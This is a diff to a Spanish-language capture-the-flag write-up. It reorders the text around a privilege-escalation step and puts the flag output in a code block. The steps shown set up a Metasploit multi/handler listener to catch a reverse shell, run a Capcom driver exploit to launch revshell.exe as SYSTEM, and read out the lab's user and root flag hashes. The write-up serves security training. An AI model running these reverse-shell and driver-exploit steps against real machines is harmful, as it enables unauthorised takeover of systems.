@@ -697,7 +697,7 @@ Data: 10240 bytes of 10240 bytes copied
 Info: Upload successful!
 ```
 
-Preparamos el módulo `multi/handler` de `Metasploit` en nuestra máquina para recibir la conexión y ejecutamos el binario a través de nuestro exploit de Capcom.
+Preparamos el módulo `multi/handler` de `Metasploit` en nuestra máquina para recibir la conexión.
 
 ```bash
 msfconsole
@@ -705,6 +705,8 @@ msf > use multi/handler
 msf exploit(multi/handler) > set LHOST 192.168.69.100
 msf exploit(multi/handler) > run
 ```
+
+Ejecutamos el binario a través de nuestro exploit de Capcom.
 
 ```powershell
 .\exploitcapcom.exe EXPLOIT revshell.exe
@@ -730,7 +732,9 @@ nt authority\system
 
 Por último, obtenemos las `flags` de usuario y root.
 
+```
 type C:\Users\Chivas Regal\Desktop\user.txt
 bb8b4df8eda73e75ca51ca88a909c1cb
 type C:\Users\Administrador\Desktop\root.txt
 cfa7cb1cc20e26c0428f9222d44c76a0
+```
